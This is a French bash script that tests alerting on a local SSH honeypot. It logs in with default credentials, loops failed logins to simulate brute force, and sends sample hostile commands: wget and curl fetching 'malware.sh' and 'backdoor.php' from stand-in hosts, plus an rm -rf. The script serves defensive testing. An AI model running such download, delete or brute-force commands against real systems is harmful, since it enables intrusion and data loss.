#!/bin/bash

# Script de test pour vérifier l'envoi d'emails

echo "════════════════════════════════════════════════════════"
echo "  📧 TEST D'ENVOI D'EMAIL DU HONEYPOT"
echo "════════════════════════════════════════════════════════"
echo ""

HONEYPOT_HOST="localhost"
HONEYPOT_PORT="2222"

echo "🔍 Vérification que le honeypot est accessible..."
if ! nc -z $HONEYPOT_HOST $HONEYPOT_PORT 2>/dev/null; then
    echo "❌ Le honeypot n'est pas accessible sur $HONEYPOT_HOST:$HONEYPOT_PORT"
    echo "   Assurez-vous que le honeypot est démarré avec:"
    echo "   docker-compose up -d --build"
    exit 1
fi

echo "✅ Honeypot accessible"
echo ""

echo "📧 Test 1: Connexion réussie (devrait envoyer un email)"
echo "   → Tentative de connexion avec admin/admin123..."
sshpass -p "admin123" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p $HONEYPOT_PORT admin@$HONEYPOT_HOST "echo 'Test connexion réussie' && exit" 2>/dev/null
echo "   ✅ Connexion réussie effectuée"
echo ""

echo "⏳ Attente de 3 secondes..."
sleep 3
echo ""

echo "📧 Test 2: Attaque brute force (devrait envoyer un email)"
echo "   → 6 tentatives échouées pour déclencher l'alerte..."
for i in {1..6}; do
    echo "   Tentative $i/6..."
    sshpass -p "wrongpassword" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p $HONEYPOT_PORT test@$HONEYPOT_HOST 2>/dev/null
done
echo "   ✅ Attaque brute force simulée"
echo ""

echo "⏳ Attente de 3 secondes..."
sleep 3
echo ""

echo "📧 Test 3: Commande dangereuse (devrait envoyer un email)"
echo "   → Exécution de commandes suspectes..."
sshpass -p "admin123" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p $HONEYPOT_PORT admin@$HONEYPOT_HOST << 'EOF'
wget http://malicious-site.com/malware.sh
curl http://evil.com/backdoor.php
rm -rf /tmp/test
exit
EOF
echo "   ✅ Commandes dangereuses exécutées"
echo ""

echo "════════════════════════════════════════════════════════"
echo "  ✅ TESTS TERMINÉS"
echo "════════════════════════════════════════════════════════"
echo ""
echo "📮 Vérifie maintenant ta boîte email: HoneyPotProject@hotmail.com"
echo ""
echo "Tu devrais avoir reçu 3 emails:"
echo "  1. [HONEYPOT ALERT] medium - successful_login"
echo "  2. [HONEYPOT ALERT] high - brute_force"
echo "  3. [HONEYPOT ALERT] high - dangerous_command (x3)"
echo ""
echo "⚠️  Si tu ne vois pas les emails:"
echo "  - Vérifie les SPAMS / Courrier indésirable"
echo "  - Vérifie les logs: docker-compose logs -f"
echo "  - Attends 1-2 minutes (délai d'envoi)"
echo ""

